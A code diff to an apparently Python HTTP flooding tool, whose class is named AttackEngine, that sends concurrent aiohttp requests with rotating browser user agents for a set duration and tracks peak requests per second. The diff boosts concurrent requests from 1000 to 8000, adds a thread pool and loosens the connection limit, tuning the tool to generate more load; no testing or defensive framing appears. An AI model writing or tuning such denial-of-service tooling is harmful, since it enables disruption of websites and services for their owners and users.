@@ -5,9 +5,10 @@ import sys
 import os
 import psutil
 import time
+from concurrent.futures import ThreadPoolExecutor
 
 # Constants
-MAX_CONCURRENT = 1000
+MAX_CONCURRENT = 8000  # Increase concurrent requests for 8 CPUs and 24GB RAM
 REQUEST_TIMEOUT = 10
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -39,6 +40,7 @@ class AttackEngine:
             'peak_rps': 0
         }
         self.process = psutil.Process(os.getpid())
+        self.executor = ThreadPoolExecutor(max_workers=8)  # Optimized number of workers (based on CPUs)
 
     # Function to make the request
     async def make_request(self, session):
@@ -63,7 +65,7 @@ class AttackEngine:
         self.start_time = time.time()
         end_time = self.start_time + self.duration
 
-        conn = aiohttp.TCPConnector(limit=None)
+        conn = aiohttp.TCPConnector(limit_per_host=None)
         async with aiohttp.ClientSession(connector=conn) as session:
             while time.time() < end_time:
                 tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
